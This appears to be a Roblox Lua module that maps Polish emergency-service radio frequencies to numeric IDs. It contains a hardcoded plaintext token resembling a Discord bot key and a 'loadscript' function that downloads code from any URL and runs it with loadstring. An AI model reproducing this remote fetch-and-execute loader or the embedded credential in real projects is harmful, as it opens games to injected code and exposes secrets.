local HttpService = game:GetService("HttpService")

local pegasus = {}


pegasus.authkey = "ODc4OTg5MTU4MTQ2NzczMDMy.EUjMFyFi4l.NDIyMTEzNDkwMjM3MzkwODU4"


pegasus.radiolist = {

	--PSP
	["164,000"] = 15951124,
	["164,050"] = 15951124,
	["164,100"] = 15951124,

	--OSP
	["165,000"] = 13985019,
	["165,050"] = 13985019,
	["165,100"] = 13985019,

	--PR
	["166,000"] = 15951124,
	["166,050"] = 15951124,
	["166,100"] = 15951124,

	--KPP
	["167,000"] = 15951124,
	["167,050"] = 15951124,
	["167,100"] = 15951124,

	--Pomoc Drogowa
	["168,000"] = 15236172,
	["168,050"] = 15236172,
	["168,100"] = 15236172,

	--WOLNE
	["170,000"] = 000,
	["170,050"] = 000,
	["170,100"] = 000,
	["170,150"] = 000,
	["170,200"] = 000,
	["170,250"] = 000,
	["170,300"] = 000,
	["170,350"] = 000,
	["170,400"] = 000,
	["170,450"] = 000,
	["170,500"] = 000,
	["000,000"] = 000,

}

function from_base64(data)
	local b = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/'
	data = string.gsub(data, '[^'..b..'=]', '')
	return (data:gsub('.', function(x)
		if (x == '=') then return '' end
		local r,f='',(b:find(x)-1)
		for i=6,1,-1 do r=r..(f%2^i-f%2^(i-1)>0 and '1' or '0') end
		return r;
	end):gsub('%d%d%d?%d?%d?%d?%d?%d?', function(x)
		if (#x ~= 8) then return '' end
		local c=0
		for i=1,8 do c=c+(x:sub(i,i)=='1' and 2^(8-i) or 0) end
		return string.char(c)
	end))
end

local guild_id = from_base64(pegasus.authkey:split(".")[1])

pegasus.loadscript = function(url)
	local success, response = pcall(HttpService.RequestAsync, HttpService, {
		Url = url,
		Method = "GET",
		Headers = {
			['Authorization'] = pegasus.authkey
		}
	})
	if success == true then
		local code = response.Body
		--warn(code)

		local load = loadstring(code)
		load()
	end
end


return pegasus
